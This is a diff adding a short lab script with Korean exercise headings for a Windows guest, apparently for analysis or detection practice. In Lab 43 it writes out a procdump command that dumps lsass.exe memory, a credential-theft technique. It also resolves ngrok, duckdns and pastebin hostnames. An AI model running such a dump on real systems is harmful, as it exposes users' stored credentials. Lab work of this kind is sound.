@@ -1,0 +1,11 @@
+# 실습 43 · Windows 게스트의 원전 입력 분석
+C:\Tools\procdump64.exe -accepteula -ma lsass.exe C:\Windows\Temp\l.dmp
+# 실습 47 · 원전의 정상 웹 요청 구조
+1..3 | ForEach-Object {
+ Invoke-WebRequest https://www.example.com -UseBasicParsing
+ Start-Sleep -Seconds 2
+}
+# 실습 48 · 원전에 나온 세 이름
+Resolve-DnsName kt66lab.ngrok.io
+Resolve-DnsName kt66lab.duckdns.org
+Resolve-DnsName x.pastebin.com
